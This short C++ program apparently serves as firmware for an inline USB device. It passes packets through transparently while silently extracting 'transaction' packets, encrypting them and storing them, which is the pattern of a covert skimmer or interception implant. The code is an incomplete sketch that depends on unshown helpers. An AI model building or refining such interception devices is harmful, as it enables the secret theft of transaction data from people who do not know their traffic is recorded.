#include "usb_io.h"
#include "crypto_helper.h"
#include <string>
#include <iostream>

int main() {
    USBDevice usbFemale, usbMale;
    AES aes(AES_KEY);

    while(true) {
        Packet packet = usbFemale.readPacket();
        if(packet.exists() && isTransaction(packet)) {
            Transaction t = parseTransaction(packet);
            t.timestamp = getCurrentTime();
            std::string logEntry = formatTransaction(t);
            std::string encrypted = aes.encrypt(logEntry, AES_KEY);
            buffer.write(encrypted);
        }
        usbMale.sendPacket(packet);
    }
    return 0;
}